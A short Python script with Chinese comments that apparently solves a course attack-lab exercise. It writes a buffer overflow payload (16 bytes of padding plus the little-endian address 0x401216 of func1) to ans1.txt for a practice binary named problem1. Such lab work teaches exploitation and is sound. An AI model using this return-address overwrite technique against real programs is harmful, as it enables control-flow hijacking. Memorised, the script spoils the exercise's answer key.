import struct

# 1. 根据 lea -0x8(%rbp) 计算: 8(buffer) + 8(saved_rbp) = 16
padding_len = 16 
padding = b'A' * padding_len

# 2. 根据 <func1> 地址填入: 0x401216
target_addr = 0x401216 

# 3. 构造 Payload (小端序)
payload = padding + struct.pack('<Q', target_addr)

# 4. 写入文件
with open("ans1.txt", "wb") as f:
    f.write(payload)

print("已生成 ans1.txt，请在终端运行 ./problem1 ans1.txt 进行验证")